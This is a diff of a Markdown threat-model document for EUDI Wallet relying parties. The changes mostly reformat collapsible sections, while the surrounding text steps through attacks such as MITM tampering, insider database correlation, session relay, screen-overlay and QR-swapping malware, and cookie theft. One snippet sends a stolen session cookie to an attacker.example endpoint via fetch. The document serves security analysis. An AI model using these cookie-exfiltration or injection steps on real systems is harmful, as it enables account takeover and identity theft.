 The `GET` request times out — the DDoS attack has saturated the PID Provider's infrastructure, rendering the PID Status List Endpoint unreachable. The RP receives a TCP timeout or HTTP 503 Service Unavailable response.
 
@@ -19933,7 +20477,8 @@ The `GET` request times out — the DDoS attack has saturated the PID Provider's
 **Artifact Produced:** Connection tracking timeout trace or explicit raw HTTP 503 unavailability metrics capture.
 
 </details>
-<details><summary><strong>5. RP Server evaluates Fail-Open/Closed Policy</strong></summary>
+<details>
+<summary><strong>5. RP Server evaluates Fail-Open/Closed Policy</strong></summary>
 
 Without a reachable endpoint or a fresh local cache, the RP Server must consult its operational fallback policy. It must either reject all users (Fail Closed: Service disruption) or accept unverified credentials (Fail Open: Allowing potentially revoked PIDs).
 
@@ -20048,14 +20593,16 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP Server generates Ephemeral Keypair</strong></summary>
+<details>
+<summary><strong>1. RP Server generates Ephemeral Keypair</strong></summary>
 
 When constructing the Authorization Request, the RP Server generates a fresh, ephemeral cryptographic keypair (e.g., P-256 for ECDH-ES). The private half strictly remains in server memory.
 
 **Artifact Produced:** Securely retained ECDH-ES ephemeral private key state bound strictly to application memory.
 
 </details>
-<details><summary><strong>2. RP Server transmits signed JAR</strong></summary>
+<details>
+<summary><strong>2. RP Server transmits signed JAR</strong></summary>
 
 The RP Server embeds only the public key material (`response_encryption_jwk`) inside the signed JAR sent to the Wallet.
 
@@ -20076,14 +20623,16 @@ The RP Server embeds only the public key material (`response_encryption_jwk`) in
 **Artifact Produced:** JSON-formatted `response_encryption_jwk` array embedded within the outbound JWS header.
 
 </details>
-<details><summary><strong>3. Network Eavesdropper intercepts transmitted JAR</strong></summary>
+<details>
+<summary><strong>3. Network Eavesdropper intercepts transmitted JAR</strong></summary>
 
 The Network Eavesdropper, positioned on the network path between the RP and the Wallet (e.g., a compromised Wi-Fi access point, a transparent proxy, or a BGP route hijack), intercepts a copy of the signed JAR. The JAR contains the RP's ephemeral public key in the `response_encryption_jwk` field — but this is only the public half. The JAR itself is signed (JWS) but not encrypted, so its contents are readable.
 
 **Artifact Produced:** Intercepted plaintext string copy of the `response_encryption_jwk` completely lacking requisite private key material.
 
 </details>
-<details><summary><strong>4. EUDI Wallet computes shared ECDH-ES secret</strong></summary>
+<details>
+<summary><strong>4. EUDI Wallet computes shared ECDH-ES secret</strong></summary>
 
 The EUDI Wallet accepts the public key and utilizes its own key agreement parameters (the ECDH-ES algorithm defined in RFC 7518) to calculate a shared symmetric secret (`Z`). This secret, combined with the Concat KDF function, derives the Content Encryption Key (CEK) used exclusively to encrypt the final `vp_token` payload.
 
@@ -20100,14 +20649,16 @@ const cek = concatKdf(sharedSecret, 256, "A256GCM");
 **Artifact Produced:** Computed symmetric Content Encryption Key (CEK) mathematically derived via Concat KDF function.
 
 </details>
-<details><summary><strong>5. EUDI Wallet returns JWE wrapped via shared secret</strong></summary>
+<details>
+<summary><strong>5. EUDI Wallet returns JWE wrapped via shared secret</strong></summary>
 
 The EUDI Wallet encrypts the `vp_token` using the derived CEK and transmits the JWE envelope to the RP's `response_uri`. The encrypted payload contains the SD-JWT VC disclosures and the Key Binding JWT.
 
 **Artifact Produced:** Fully encrypted JWE envelope explicitly protecting the `vp_token` from network-level extraction.
 
 </details>
-<details><summary><strong>6. Network Eavesdropper intercepts encrypted JWE return payload</strong></summary>
+<details>
+<summary><strong>6. Network Eavesdropper intercepts encrypted JWE return payload</strong></summary>
 
 Although the Network Eavesdropper intercepted both the outbound JAR (containing the public key) and the inbound encrypted JWE response, they cannot derive the shared secret. Without the RP Server's memory-bound private key, decryption is mathematically infeasible.
 
@@ -20177,7 +20728,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP Server transmits signed JAR</strong></summary>
+<details>
+<summary><strong>1. RP Server transmits signed JAR</strong></summary>
 
 The RP Server rigorously formats and sends a cryptographically signed Authorization Request (JAR) defining the minimal, strictly necessary subset of PID attributes using standard Presentation Exchange (PEX) or DCQL conventions.
 
@@ -20201,7 +20753,8 @@ The RP Server rigorously formats and sends a cryptographically signed Authorizat
 **Artifact Produced:** Legitimate JWS Authorization Request securely carrying the RP's exact ECDSA signature configuration.
 
 </details>
-<details><summary><strong>2. Network MITM forwards altered JAR</strong></summary>
+<details>
+<summary><strong>2. Network MITM forwards altered JAR</strong></summary>
 
 A Network MITM intercepts the JAR and tampers with the JSON payload—for example, injecting a demand for the user's `birth_date` and `address` into the `dcql_query` or altering the `response_uri`—before passing it to the Wallet.
 
@@ -20215,8 +20768,8 @@ A Network MITM intercepts the JAR and tampers with the JSON payload—for exampl
         "format": "vc+sd-jwt",
         "claims": [
           { "path": [ "family_name" ] },
-          { "path": [ "birth_date" ] }, // <-- Injecting extra claims
-          { "path": [ "address" ] }    // <-- Injecting extra claims
+          { "path": [ "birth_date" ] }, // &lt;-- Injecting extra claims
+          { "path": [ "address" ] }    // &lt;-- Injecting extra claims
         ]
       }
     ]
@@ -20227,14 +20780,16 @@ A Network MITM intercepts the JAR and tampers with the JSON payload—for exampl
 **Artifact Produced:** Manipulated JSON payload actively injecting unauthorized `birth_date` and `address` retrieval claims.
 
 </details>
-<details><summary><strong>3. EUDI Wallet verifies JWS signature</strong></summary>
+<details>
+<summary><strong>3. EUDI Wallet verifies JWS signature</strong></summary>
 
 The EUDI Wallet receives the JAR and attempts to verify the JSON Web Signature (JWS) mathematically using the public key from the appended `x5c` certificate chain originating from the RP.
 
 **Artifact Produced:** Cryptographic SHA-256 buffer computed physically over the altered JSON input.
 
 </details>
-<details><summary><strong>4. EUDI Wallet rejects request automatically</strong></summary>
+<details>
+<summary><strong>4. EUDI Wallet rejects request automatically</strong></summary>
 
 Because the core JSON properties were tampered with during transit, the cryptographic SHA-256 hash computed fundamentally over the new payload no longer matches the appended ECDSA string evaluated against the RP's trusted public key. 
 
@@ -20317,7 +20872,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Rogue Insider abuses legitimate admin credentials</strong></summary>
+<details>
+<summary><strong>1. Rogue Insider abuses legitimate admin credentials</strong></summary>
 
 A Rogue Insider (e.g., a compromised internal employee account) uses their legitimate access rights to query the RP's internal management APIs or back-office interfaces, extracting raw, decrypted PID attributes.
 
@@ -20351,7 +20907,8 @@ X-Request-Reason: quarterly-audit
 **Artifact Produced:** Authorized HTTP `GET /admin/users/export` session execution retrieving sensitive core objects.
 
 </details>
-<details><summary><strong>2. RP Internal API returns raw decrypted PID attributes</strong></summary>
+<details>
+<summary><strong>2. RP Internal API returns raw decrypted PID attributes</strong></summary>
 
 The RP Internal API — which lacks field-level encryption or attribute redaction controls — returns the full set of decrypted PID attributes (family_name, given_name, birth_date, nationality, portrait photograph) in plaintext JSON. The absence of data minimisation at the API layer means the Insider receives far more data than operationally necessary.
 
@@ -20400,7 +20957,8 @@ The RP Internal API — which lacks field-level encryption or attribute redactio
 **Artifact Produced:** Plaintext JSON array extracting explicitly decrypted `family_name` and `birth_date` data elements.
 
 </details>
-<details><summary><strong>3. Rogue Insider executes direct SQL database correlation</strong></summary>
+<details>
+<summary><strong>3. Rogue Insider executes direct SQL database correlation</strong></summary>
 
 If the RP fails to practice technical data minimization (e.g., permanently retaining the `sd_jwt_salt` disclosure hashes or the `cnf.jwk` thumbprints instead of immediately discarding them post-verification per ARF §9.4), the Rogue Insider can execute bulk database queries. This maliciously links separate, supposedly anonymous transactions back to continuous user profiles.
 
@@ -20416,7 +20974,8 @@ WHERE t1.cnf_jwk_thumbprint = '2a9f...';
 **Artifact Produced:** Shadow user profile aggregated across transaction boundaries via un-scrubbed `sd_jwt_salt` global identifiers.
 
 </details>
-<details><summary><strong>4. Rogue Insider exfiltrates data to Darknet Market</strong></summary>
+<details>
+<summary><strong>4. Rogue Insider exfiltrates data to Darknet Market</strong></summary>
 
 The Rogue Insider bundles the compiled identity intelligence and exfiltrates it outside the corporate perimeter to a darknet endpoint, bypassing EUDI cryptographic protections entirely because the data was already parsed and stored in plaintext by the application layer.
 
@@ -20483,7 +21042,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Attacker crafts malformed credential</strong></summary>
+<details>
+<summary><strong>1. Attacker crafts malformed credential</strong></summary>
 
 The Attacker manipulates a cryptographic attribute (e.g., mismatching an SD-JWT disclosure hash, manually flipping a Status List revocation bit, or truncating an X.509 certificate chain) specifically designed to trigger an edge-case parser bug.
 
@@ -20524,7 +21084,8 @@ The Attacker manipulates a cryptographic attribute (e.g., mismatching an SD-JWT 
 **Artifact Produced:** Malformed SD-JWT VC with deliberately mismatched disclosure hash targeting parser edge cases.
 
 </details>
-<details><summary><strong>2. Attacker submits malformed payload to RP Server</strong></summary>
+<details>
+<summary><strong>2. Attacker submits malformed payload to RP Server</strong></summary>
 
 The Attacker submits this intentionally malformed `vp_token` payload directly to the Relying Party's `response_uri`.
 
@@ -20548,7 +21109,8 @@ vp_token=eyJhbGciOiJFUzI1NiIsInR5cCI6InZjK3NkLWp3dCJ9
 **Artifact Produced:** Malformed SD-JWT or Status List byte buffer mathematically crafted to bypass execution boundaries.
 
 </details>
-<details><summary><strong>3. RP Verification SDK falsely evaluates payload as VALID</strong></summary>
+<details>
+<summary><strong>3. RP Verification SDK falsely evaluates payload as VALID</strong></summary>
 
 Due to a zero-day logic flaw or an unpatched vulnerability within the 3rd-party RP Verification SDK library (e.g., an off-by-one array evaluation skipping a signature check, or a failure to stringently enforce the `iat` epoch constraints per RFC 9068), the underlying verifier returns a `true` boolean state.
 
@@ -20571,14 +21133,16 @@ function verifyDisclosure(disclosure, targetHash) {
 **Artifact Produced:** False-positive validation boolean silently generated by the underlying execution flaw.
 
 </details>
-<details><summary><strong>4. RP Verification SDK returns corrupted identity assertion</strong></summary>
+<details>
+<summary><strong>4. RP Verification SDK returns corrupted identity assertion</strong></summary>
 
 The RP Application receives the "verified" boolean flag from the SDK, wrongfully trusts it, and prepares to grant the Attacker unauthorized access or execute an unverified financial transaction.
 
 **Artifact Produced:** Corrupted, unverified JSON identity entity mistakenly propagated to the logical application layer.
 
 </details>
-<details><summary><strong>5. RP Application grants unauthorized access</strong></summary>
+<details>
+<summary><strong>5. RP Application grants unauthorized access</strong></summary>
 
 The RP Application layer, acting implicitly on the corrupted assertion from the vulnerable SDK, grants the Attacker full authenticated access — onboarding a fraudulent identity, authorising a financial transaction, or issuing session credentials that can be reused indefinitely until the SDK vulnerability is patched and the affected sessions are invalidated.
 
@@ -20653,14 +21217,16 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Attacker requests Authorization URI</strong></summary>
+<details>
+<summary><strong>1. Attacker requests Authorization URI</strong></summary>
 
 The Attacker begins a legitimate login flow on the Relying Party's infrastructure, receiving an `openid4vp://` connection string containing a cryptographically valid `state` parameter permanently bound to the Attacker's active session.
 
 **Artifact Produced:** Server-generated `state` context tightly bounding the Attacker's origin HTTP connection.
 
 </details>
-<details><summary><strong>2. RP Server returns Authorization URI with Attacker's state</strong></summary>
+<details>
+<summary><strong>2. RP Server returns Authorization URI with Attacker's state</strong></summary>
 
 The RP Server responds with an `openid4vp://` URI containing the Attacker's session-bound `state` parameter and a `request_uri` pointing to the JAR. This is a standard, legitimate response — the RP has no way of knowing that the requester intends to relay this URI to a third party.
 
@@ -20677,7 +21243,7 @@ openid4vp://?
 # vp_token delivered to the RP tagged with the attacker's session.
 #
 # The attacker will relay this URI to the victim via:
-#   - Hidden iframe: <iframe src="openid4vp://...">
+#   - Hidden iframe: &lt;iframe src="openid4vp://...">
 #   - JavaScript redirect: window.location = "openid4vp://..."
 #   - Phishing email with deep link
 ```
@@ -20685,21 +21251,24 @@ openid4vp://?
 **Artifact Produced:** Rendered `openid4vp://` string structurally embedding the malicious `state` identifier tag.
 
 </details>
-<details><summary><strong>3. Attacker delivers URI to Victim</strong></summary>
+<details>
+<summary><strong>3. Attacker delivers URI to Victim</strong></summary>
 
 The Attacker maliciously injects this exact URI into the Victim's browser (e.g., via an iframe, automated redirect, or a phishing email link).
 
 **Artifact Produced:** Obfuscated network execution link invisibly deployed inside the Victim's browser.
 
 </details>
-<details><summary><strong>4. Victim clicks injected malicious link</strong></summary>
+<details>
+<summary><strong>4. Victim clicks injected malicious link</strong></summary>
 
 The unsuspecting Victim clicks the link, inadvertently launching their EUDI Wallet using the Attacker's crafted initialization string.
 
 **Artifact Produced:** OS-level intent effectively hijacking the Victim's Wallet using the injected schema.
 
 </details>
-<details><summary><strong>5. Victim Wallet completes presentation</strong></summary>
+<details>
+<summary><strong>5. Victim Wallet completes presentation</strong></summary>
 
 The Victim Wallet performs the standard cryptographic presentation and deposits the encrypted JWE `vp_token` payload at the RP's `response_uri`, passing back the exact `state=ATTACKER_STATE` parameter natively pulled from the URL.
 
@@ -20716,7 +21285,8 @@ vp_token=eyJhbG...[JWE]...
 **Artifact Produced:** Genuine JWE `vp_token` submission fundamentally mislabelled containing the Attacker's `state`.
 
 </details>
-<details><summary><strong>6. RP Server processes response</strong></summary>
+<details>
+<summary><strong>6. RP Server processes response</strong></summary>
 
 The RP Server decrypts the payload, determines it is mathematically valid, and binds the newly verified identity attributes to the active session strictly identified by `ATTACKER_STATE`.
 
@@ -20758,7 +21328,8 @@ The RP Server decrypts the payload, determines it is mathematically valid, and b
 **Artifact Produced:** Legitimate decrypted PID payload fatally appended to the `ATTACKER_STATE` memory context.
 
 </details>
-<details><summary><strong>7. RP Server elevates Attacker's active session as Victim</strong></summary>
+<details>
+<summary><strong>7. RP Server elevates Attacker's active session as Victim</strong></summary>
 
 Because the Attacker holds the session cookie natively logically associated with the `ATTACKER_STATE`, the RP Server seamlessly elevates the Attacker's privilege, logging them into the Victim's hijacked identity context.
 
@@ -20834,7 +21405,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Returning User presents credentials to Relying Party Server (Session A)</strong></summary>
+<details>
+<summary><strong>1. Returning User presents credentials to Relying Party Server (Session A)</strong></summary>
 
 A user authenticates with an RP out of necessity, releasing their `family_name`. Within the cryptography of an SD-JWT VC, the actual string is hashed using a unique, randomized `sd_jwt_salt` attached specifically to that single presentation attribute during issuance.
 
@@ -20850,7 +21422,8 @@ A user authenticates with an RP out of necessity, releasing their `family_name`.
 **Artifact Produced:** `sd_jwt_salt` presentation attribute hash (Cryptographic layer).
 
 </details>
-<details><summary><strong>2. RP Server illegitimately stores correlation data</strong></summary>
+<details>
+<summary><strong>2. RP Server illegitimately stores correlation data</strong></summary>
 
 Violating EUDI data minimization principles, the RP Server persistently saves the raw `sd_jwt_salt` (or a `cnf.jwk` thumbprint, or a Status List index) into their backend database alongside the user profile rather than fundamentally discarding it immediately post-verification.
 
@@ -20867,7 +21440,8 @@ VALUES ('session_A', 'Müller', '2GLC42sKQveCfGfryNRN9w');
 **Artifact Produced:** `user_profiles` correlation record (Database layer).
 
 </details>
-<details><summary><strong>3. Returning User presents credentials to Relying Party Server (Session B)</strong></summary>
+<details>
+<summary><strong>3. Returning User presents credentials to Relying Party Server (Session B)</strong></summary>
 
 Weeks later, the user returns under a supposedly anonymous context, releasing only an `age_over_18` boolean predicate to access restricted content. However, because they are presenting the *same* physical attestation (Method A, single-issuance per ARF), the underlying `sd_jwt_salt` for that specific age claim remains mathematically identical.
 
@@ -20880,7 +21454,8 @@ Weeks later, the user returns under a supposedly anonymous context, releasing on
 **Artifact Produced:** Identical physical attestation string (Application layer).
 
 </details>
-<details><summary><strong>4. RP Server queries database utilizing fixed salt</strong></summary>
+<details>
+<summary><strong>4. RP Server queries database utilizing fixed salt</strong></summary>
 
 The RP Server automatically sweeps its database, explicitly evaluating if the newly presented string of unique cryptographic artifacts mathematically matches any pre-existing historical logs.
 
@@ -20895,7 +21470,8 @@ WHERE linked_salt = '2GLC42sKQveCfGfryNRN9w';
 **Artifact Produced:** `user_profiles` correlation match result (Database layer).
 
 </details>
-<details><summary><strong>5. RP Server De-anonymizes Session B</strong></summary>
+<details>
+<summary><strong>5. RP Server De-anonymizes Session B</strong></summary>
 
 The RP Server algorithmically links Session B to Session A, merging the supposedly anonymous age-check directly into the user's permanent, named surveillance profile and utterly defeating the exact selective disclosure safeguards that SD-JWT VC was designed to guarantee.
 
@@ -20963,7 +21539,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Citizen presents medical attributes to Healthcare RP</strong></summary>
+<details>
+<summary><strong>1. Citizen presents medical attributes to Healthcare RP</strong></summary>
 
 The Citizen utilizes their EUDI Wallet to securely present health credentials to a Healthcare RP. The underlying transmission structurally includes fixed cryptographic constants, such as the `cnf_jwk` thumbprint representing the public key permanently bound to the attestation.
 
@@ -20978,7 +21555,8 @@ The Citizen utilizes their EUDI Wallet to securely present health credentials to
 **Artifact Produced:** `health_condition` disclosure payload mapping (Application layer).
 
 </details>
-<details><summary><strong>2. Citizen presents financial attributes to Insurance RP</strong></summary>
+<details>
+<summary><strong>2. Citizen presents financial attributes to Insurance RP</strong></summary>
 
 Shortly after, the Citizen utilizes the identical attestation to present financial data to an independent Insurance RP. 
 
@@ -20995,7 +21573,8 @@ Because the citizen hasn't rotated their credential, the mathematically identica
 **Artifact Produced:** `credit_tier` disclosure payload mapping (Application layer).
 
 </details>
-<details><summary><strong>3. Healthcare RP sells anonymized log</strong></summary>
+<details>
+<summary><strong>3. Healthcare RP sells anonymized log</strong></summary>
 
 Believing the data is "safely anonymized" due to systematically stripping direct names, the Healthcare RP sells a data dump inadvertently mapping the allegedly "meaningless" `thumbprint` string directly to a highly sensitive medical diagnosis condition.
 
@@ -21008,7 +21587,8 @@ user_339,xyz890,Diabetes,2024-03-01T12:00:00Z
 **Artifact Produced:** `internal_id` anonymized data broker feed (External layer).
 
 </details>
-<details><summary><strong>4. Insurance RP sells anonymized log</strong></summary>
+<details>
+<summary><strong>4. Insurance RP sells anonymized log</strong></summary>
 
 The Insurance RP simultaneously sells bulk financial analytics, similarly mapping the structurally identical `thumbprint` string to the user's credit score standing within their own supposedly anonymous logs.
 
@@ -21021,7 +21601,8 @@ cust_99x,xyz890,Poor,2024-03-05T14:30:00Z
 **Artifact Produced:** `customer_ref` anonymized data broker feed (External layer).
 
 </details>
-<details><summary><strong>5. Data Broker executes Wholesale Surveillance</strong></summary>
+<details>
+<summary><strong>5. Data Broker executes Wholesale Surveillance</strong></summary>
 
 A central Data Broker (or colluding corporate parent) acquires both datasets. By executing a simple database `JOIN` operation matching on the `thumbprint` strings, the Broker synthesizes a catastrophic cross-service behavior graph, inextricably linking the user's hidden financial constraints to their medical vulnerabilities. This enacts the exact Wholesale Surveillance system risk (SR1) defined in the ARF.
 
@@ -21102,7 +21683,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User Wallet issues Presentation 1 to RP Server (Jan 10)</strong></summary>
+<details>
+<summary><strong>1. User Wallet issues Presentation 1 to RP Server (Jan 10)</strong></summary>
 
 A user authenticates utilizing their wallet. The protocol innately contains fixed structural constants necessary for cryptographic validation, such as the `Status List Index` (e.g., `45991`) mapped specifically to that individual attestation.
 
@@ -21121,7 +21703,8 @@ A user authenticates utilizing their wallet. The protocol innately contains fixe
 **Artifact Produced:** Decoded attestation revocation block (Cryptographic layer).
 
 </details>
-<details><summary><strong>2. User Wallet issues Presentation 2 to RP Server (Feb 15)</strong></summary>
+<details>
+<summary><strong>2. User Wallet issues Presentation 2 to RP Server (Feb 15)</strong></summary>
 
 The user returns to the RP Server over a month later. Even if they present completely different pseudo-anonymous attributes to mask their returning identity, the identical structural constraints (the exact same `Status List Index` mapped to that credential serial) must logically be transmitted again to allow the RP to check revocation.
 
@@ -21141,7 +21724,8 @@ The user returns to the RP Server over a month later. Even if they present compl
 
 
 </details>
-<details><summary><strong>3. RP Server traces user movement across time</strong></summary>
+<details>
+<summary><strong>3. RP Server traces user movement across time</strong></summary>
 
 Whether maliciously executed by the RP Server itself, or passively observed by an infrastructure-level network interceptor monitoring the `/status-list` `GET` requests, the exact `45991` index tracks the user's recurrent presence without ever requiring access to their literal identity data. This breaks the unlinkability requirements defined in eIDAS Article 5b.
 
@@ -21229,7 +21813,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP Server registers intended attributes with Registrar</strong></summary>
+<details>
+<summary><strong>1. RP Server registers intended attributes with Registrar</strong></summary>
 
 The RP registers with the National Ecosystem precisely articulating its use case (e.g., merely validating age for age-restricted purchases), legally limiting its logical access constraints via the WRPRC ruleset.
 
@@ -21245,7 +21830,8 @@ The RP registers with the National Ecosystem precisely articulating its use case
 **Artifact Produced:** `client_id` registration request (Business layer).
 
 </details>
-<details><summary><strong>2. Registrar issues WRPRC Certificate</strong></summary>
+<details>
+<summary><strong>2. Registrar issues WRPRC Certificate</strong></summary>
 
 The national Registrar issues a WRPRC that codifies the RP's declared intended attributes (`age_over_18` only). This certificate serves as the ecosystem's governance control — the Wallet can later compare the RP's actual DCQL request against the WRPRC's attribute scope to detect over-collection.
 
@@ -21261,7 +21847,8 @@ The national Registrar issues a WRPRC that codifies the RP's declared intended a
 **Artifact Produced:** `WRPRC Certificate` token (Ecosystem layer).
 
 </details>
-<details><summary><strong>3. RP Server transmits lazy Authorization Request to EUDI Wallet</strong></summary>
+<details>
+<summary><strong>3. RP Server transmits lazy Authorization Request to EUDI Wallet</strong></summary>
 
 Due to poor engineering logic or convenience-driven laziness, the RP constructs an inflated, overarching `dcql_query` sweeping the user's entire core PID dataset (`family_name`, `birth_date`, `address`), fundamentally disregarding overarching ecosystem privacy covenants and the GDPR data minimization mandate (Art 5).
 
@@ -21287,13 +21874,15 @@ Due to poor engineering logic or convenience-driven laziness, the RP constructs 
 **Artifact Produced:** `dcql_query` Authorization Request (Application layer).
 
 </details>
-<details><summary><strong>4. User blindly approves over-extended request</strong></summary>
+<details>
+<summary><strong>4. User blindly approves over-extended request</strong></summary>
 
 Assuming the system is fully automated and structurally governed by the Wallet, the User casually accepts the Wallet Unit's consent screen without carefully auditing the bloated attribute list, wrongly assuming the RP is only extracting their age.
 
 
 </details>
-<details><summary><strong>5. EUDI Wallet transmits excessive attributes to RP Server</strong></summary>
+<details>
+<summary><strong>5. EUDI Wallet transmits excessive attributes to RP Server</strong></summary>
 
 The Wallet faithfully constructs the extensive presentation response, transferring the User's unmitigated, highly sensitive demographic profile directly into the RP's backend, significantly magnifying the severity of any subsequent internal data breaches and blatantly violating GDPR Art. 5.
 
@@ -21377,7 +21966,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. EUDI Wallet renders legitimate Consent Screen</strong></summary>
+<details>
+<summary><strong>1. EUDI Wallet renders legitimate Consent Screen</strong></summary>
 
 The EUDI Wallet natively renders the actual identity of the requesting Relying Party, explicitly listing exactly which attribute claims will be surrendered (e.g., "Shady LLC requests: full PID") based on the verified WRPAC chain.
 
@@ -21389,7 +21979,8 @@ The EUDI Wallet natively renders the actual identity of the requesting Relying P
 ```
 
 </details>
-<details><summary><strong>2. Active Malware injects UI DOM overlay onto EUDI Wallet</strong></summary>
+<details>
+<summary><strong>2. Active Malware injects UI DOM overlay onto EUDI Wallet</strong></summary>
 
 Rogue device-level malware draws a sophisticated, opaque visual overlay *on top* of the Wallet app interface, deceptively obscuring the core identity text to falsely display a trustworthy origin like: "Official State Portal". This operates inherently at the OS Display level, entirely bypassing the Wallet's native application sandbox.
 
@@ -21410,13 +22001,15 @@ Rogue device-level malware draws a sophisticated, opaque visual overlay *on top*
 **Artifact Produced:** `SCREEN_OVERLAY_ATTACK_DETECTED` system protection alert (Device layer).
 
 </details>
-<details><summary><strong>3. Victim User taps Authorize below overlay</strong></summary>
+<details>
+<summary><strong>3. Victim User taps Authorize below overlay</strong></summary>
 
 Fooled by the malicious visual manipulation actively overlaid across their own screen, the User physically clicks or biometric-authenticates the underlying actual Wallet "Approve" button, genuinely believing they are proceeding with a secure, regulated governmental action.
 
 
 </details>
-<details><summary><strong>4. EUDI Wallet Secure Enclave processes valid signing</strong></summary>
+<details>
+<summary><strong>4. EUDI Wallet Secure Enclave processes valid signing</strong></summary>
 
 Because the Wallet's hardware-backed Secure Element (WSCD) accurately interprets the physical approval signal independently of the display layer OS, it performs an entirely legitimate cryptographic ECDSA signing operation, blindly executing a catastrophic data transfer to the attacker without the system triggering an internal constraint fault.
 
@@ -21492,7 +22085,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Victim Browser executes flawless EUDI PID verification with RP Server</strong></summary>
+<details>
+<summary><strong>1. Victim Browser executes flawless EUDI PID verification with RP Server</strong></summary>
 
 The User executes an impeccable cryptographic authentication mechanism, relying flawlessly on the strongest EUDI Wallet security standards (JWS/JWE end-to-end processing) operating over the W3C DC API.
 
@@ -21507,7 +22101,8 @@ The User executes an impeccable cryptographic authentication mechanism, relying 
 **Artifact Produced:** Verified `vp_token` authentication payload (Cryptographic layer).
 
 </details>
-<details><summary><strong>2. RP Server grants standard web session to Victim Browser</strong></summary>
+<details>
+<summary><strong>2. RP Server grants standard web session to Victim Browser</strong></summary>
 
 Successfully decrypting the Wallet's secure payload, the Relying Party Server transitions the verified state into a standard web JWT/Cookie paradigm, dispensing a standard `AUTH_SESS_ID` string to the User's browser. The EUDI cryptographic boundary officially ends here.
 
@@ -21523,7 +22118,8 @@ Content-Type: application/json
 
 
 </details>
-<details><summary><strong>3. Evil Extension automatically scrapes DOM from Victim Browser</strong></summary>
+<details>
+<summary><strong>3. Evil Extension automatically scrapes DOM from Victim Browser</strong></summary>
 
 A malicious Man-in-the-Browser (MitB) extension or resident JavaScript logic quietly hoovers the plaintext `AUTH_SESS_ID` token directly from the vulnerable local browser storage buffer (document.cookie).
 
@@ -21537,7 +22133,8 @@ fetch("https://attacker.example/exfil", { method: "POST", body: targetSession.va
 **Artifact Produced:** Exfiltrated `AUTH_SESS_ID` token (Browser layer).
 
 </details>
-<details><summary><strong>4. Evil Extension replays raw application cookie to RP Server</strong></summary>
+<details>
+<summary><strong>4. Evil Extension replays raw application cookie to RP Server</strong></summary>
 
 Bypassing the intricate, impenetrable EUDI cryptography entirely—because the subsequent web session assumes it is implicitly authenticated—the attacker simply injects the stolen cookie into an independent external HTTP request sent from their command server.
 
@@ -21550,7 +22147,8 @@ Cookie: AUTH_SESS_ID=eyJhbG...
 **Artifact Produced:** Replayed HTTP request bypassing EUDI (Network layer).
 
 </details>
-<details><summary><strong>5. RP Server grants full Account Takeover to Evil Extension</strong></summary>
+<details>
+<summary><strong>5. RP Server grants full Account Takeover to Evil Extension</strong></summary>
 
 The Relying Party Server blindly identifies the structurally valid tracking cookie, systematically executing a catastrophic, retroactive hijack of the identity session established exclusively via the high-security Wallet mechanism.
 
@@ -21625,7 +22223,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP Server renders genuine Request QR code to Victim Browser</strong></summary>
+<details>
+<summary><strong>1. RP Server renders genuine Request QR code to Victim Browser</strong></summary>
 
 The legitimate Relying Party Server generates a perfectly secure, session-bound QR code instructing the Wallet to contact `legitimate-rp.example` utilizing the OpenID4VP URI scheme.
 
@@ -21633,17 +22232,18 @@ The legitimate Relying Party Server generates a perfectly secure, session-bound 
 
 
 </details>
-<details><summary><strong>2. Desktop Malware manipulates DOM of Victim Browser</strong></summary>
+<details>
+<summary><strong>2. Desktop Malware manipulates DOM of Victim Browser</strong></summary>
 
 Local malware or a malicious browser extension actively monitoring the Victim's desktop visual interface intercepts the HTML rendering process. It swaps the legitimate graphic with a counterfeit QR code pointing to an attacker-controlled endpoint.
 
 ```html
-<!-- Legitimate DOM sent by RP -->
+&lt;!-- Legitimate DOM sent by RP -->
 <div id="eudi-qr-container">
   <img src="qr_legitimate_rp.png" data-uri="openid4vp://?client_id=bank.example" />
 </div>
 
-<!-- Malware aggressively rewrites the DOM in-memory before display -->
+&lt;!-- Malware aggressively rewrites the DOM in-memory before display -->
 <div id="eudi-qr-container">
   <img src="qr_evil_attacker.png" data-uri="openid4vp://?client_id=malicious-proxy.xyz" />
 </div>
@@ -21652,7 +22252,8 @@ Local malware or a malicious browser extension actively monitoring the Victim's 
 **Artifact Produced:** Counterfeit DOM injection (Browser layer).
 
 </details>
-<details><summary><strong>3. Victim Wallet scans rogue QR code from Victim Browser</strong></summary>
+<details>
+<summary><strong>3. Victim Wallet scans rogue QR code from Victim Browser</strong></summary>
 
 The Victim utilizes their independent EUDI Wallet to physically scan the desktop screen. Because the visual QR code simply dictates the routing `request_uri`, the Wallet faithfully initiates a connection to `malicious-proxy.xyz` as instructed precisely by the malware graphic.
 
@@ -21665,7 +22266,8 @@ User-Agent: EUDI-Wallet/1.0
 **Artifact Produced:** Rogue URI routing intent (Application layer).
 
 </details>
-<details><summary><strong>4. Victim Wallet transmits presentation to Desktop Malware</strong></summary>
+<details>
+<summary><strong>4. Victim Wallet transmits presentation to Desktop Malware</strong></summary>
 
 Operating under the explicit assumption the QR code physically originated from the trusted service they intended to log into, the User actively executes the presentation, blindly transmitting their identity artifacts directly to the attacker's infrastructure.
 
@@ -21749,7 +22351,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Legitimate User authenticates successfully with RP Server</strong></summary>
+<details>
+<summary><strong>1. Legitimate User authenticates successfully with RP Server</strong></summary>
 
 Thousands of sovereign users legitimately interact with the RP infrastructure over time, securely transferring their identity metrics utilizing rigorous, cutting-edge EUDI cryptographic transmission pipelines (JWE encrypted payloads).
 
@@ -21764,7 +22367,8 @@ Thousands of sovereign users legitimately interact with the RP infrastructure ov
 ```
 
 </details>
-<details><summary><strong>2. RP Server decrypts PID</strong></summary>
+<details>
+<summary><strong>2. RP Server decrypts PID</strong></summary>
 
 The RP Server logically peels back the JWS/JWE envelopes natively within its secure backend enclave, distilling the complex mathematical OpenID4VP presentation down to plaintext character strings in the application memory for business logic evaluation.
 
